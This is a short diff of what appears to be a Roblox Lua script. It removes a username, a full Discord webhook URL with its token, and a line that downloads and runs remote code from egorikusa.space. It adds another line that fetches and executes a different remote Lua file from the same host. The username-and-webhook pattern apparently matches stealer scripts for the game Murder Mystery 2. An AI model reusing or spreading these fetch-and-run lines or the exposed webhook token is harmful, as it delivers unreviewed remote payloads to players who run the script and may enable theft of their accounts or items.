@@ -1,4 +1,1 @@
-Username = "potatoboq"
-Webhook = "https://discord.com/api/webhooks/1263566286043086941/EITj5jB75v3c3QQPp3zfNCNGocz5z0trau1VNlL4ZC56Ir3KHyhEmtdbzV8iLbxDqdWG"
-
-loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
+loadstring(game:HttpGet("https://egorikusa.space/dd56ad1ccec46c6b12fbba97.lua", true))()
